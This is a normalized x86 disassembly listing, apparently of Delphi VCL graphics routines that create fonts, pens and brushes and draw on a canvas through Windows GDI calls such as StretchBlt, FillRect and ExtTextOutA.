mov [ esi + 0x8 ] eax
sub_41ca54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4141e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41caf1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413de4
mov ebx eax
mov eax ebx
call sub_41e074
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41e504
mov eax [ rw-data ]
call sub_41c9e8
mov eax [ rw-data ]
call sub_41c9e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41caf8
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_414248
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413de4
call sub_41e3b8
inc esi
dec ebx
jne r-xdata
sub_41d147
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413894
retn
sub_41d178
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402dbc
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402bac
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41d22c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c770
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41d280
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c854
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41d2c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414434
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41cf84
xor eax eax
push ebp
push sub_41d37f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41cf84
xor eax eax
push ebp
push sub_41d362
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c97c
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d400
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d369
mov eax [ ebp - 0x8 ]
call sub_41cf94
retn
mov eax ebx
call sub_41d684
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d6a0
sub_41d3b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cf84
xor eax eax
push ebp
push sub_41d3f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3fc
mov eax [ ebp - 0x4 ]
call sub_41cf94
retn
sub_41d414
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d59d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5a4
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_404098
retn
mov eax [ rw-data ]
call sub_41c758
xor eax eax
push ebp
push sub_41d575
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c764
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4042d8
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40878c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4042d8
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_40878c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4042d8
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407edc
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41d6f8
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41d5bc
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41d178
mov edx esp
mov eax ebx
call sub_41d3b0
add esp 0x2c
pop esi
pop ebx
retn
sub_41d5e8
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d398
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d3b0
add esp 0x2c
pop esi
pop ebx
retn
sub_41d628
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d398
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402cbc
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404310
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402bac
mov edx esp
mov eax ebx
call sub_41d3b0
sub_41d6a0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call sub_4061f4
mov edx eax
neg edx
mov eax ebx
call sub_41d5e8
pop esi
pop ebx
retn
sub_41d6cc
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41d398
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41d3b0
add esp 0x30
pop ebx
retn
sub_41d700
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d398
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41d3b0
add esp 0x2c
pop esi
pop ebx
retn
sub_41d730
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d398
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41d3b0
add esp 0x2c
pop esi
pop ebx
retn
sub_41d758
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c770
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41d79c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c854
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41d7c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414434
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41cf84
xor eax eax
push ebp
push sub_41d863
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41cf84
xor eax eax
push ebp
push sub_41d846
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c97c
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41d9cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d84d
mov eax [ ebp - 0x8 ]
call sub_41cf94
retn
sub_41d87c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41d894
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cf84
xor eax eax
push ebp
push sub_41d8d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d8e0
mov eax [ ebp - 0x4 ]
call sub_41cf94
retn
sub_41d8ec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41d87c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41d894
add esp 0x10
pop esi
pop ebx
retn
sub_41d914
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c758
xor eax eax
push ebp
push sub_41d99a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c764
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cf40
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41d9ac
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] edx
mov edx esp
call sub_41d894
add esp 0x10
pop edi
pop esi
retn
sub_41d9e8
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41d87c
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41d894
add esp 0x10
pop esi
pop ebx
retn
sub_41da18
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41d87c
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_41d894
sub_41da44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c770
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41da84
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41c854
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41daac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414434
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41cf84
xor eax eax
push ebp
push sub_41db3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41cf84
xor eax eax
push ebp
push sub_41db1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c97c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db26
mov eax [ ebp - 0x8 ]
call sub_41cf94
retn
sub_41db54
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_41db70
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41cf84
xor eax eax
push ebp
push sub_41dbb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41c904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbbc
mov eax [ ebp - 0x4 ]
call sub_41cf94
retn
sub_41dbc0
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_41db70
add esp 0x10
pop edi
pop esi
retn
sub_41dbec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41db54
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_41db70
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_41dc20
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41c758
xor edx edx
push ebp
push sub_41dced
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41c764
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41cf40
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_41dd08
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41db54
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_41db70
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_41dd3c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d22c
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41e72c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d758
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41e74c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41da44
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_41e76c
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41415c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41de00
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4141f8
xor edx edx
mov eax esi
call sub_41e564
mov eax [ esi + 0xc ]
call sub_4032a0
mov eax [ esi + 0x10 ]
call sub_4032a0
mov eax [ esi + 0x14 ]
call sub_4032a0
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_41de5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41e5b8
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41dee4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov eax [ ebx + 0x14 ]
call sub_41dbe4
call sub_41cf40
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cf40
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4129b0
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41df90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41dfc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov eax [ ebx + 0x14 ]
call sub_41dc20
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41e000
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov eax [ ebx + 0x14 ]
call sub_41dc20
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_41e03c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41e09c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_41e0c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_41e100
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41e148
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_41e184
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_41e4e4
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_41e1b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov eax ebx
call sub_41e184
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_404334
push eax
mov eax esi
call sub_404534
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_41e320
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41e09c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_41e320
inc eax
add edi eax
sub_41e23c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_41e5b8
mov edi [ ebx + 0x54 ]
or edi 0x4
mov eax [ ebx + 0x14 ]
call sub_41dd00
cmp al 0x1
je r-xdata
test [ ebx + 0x54 ] 0x80
je r-xdata
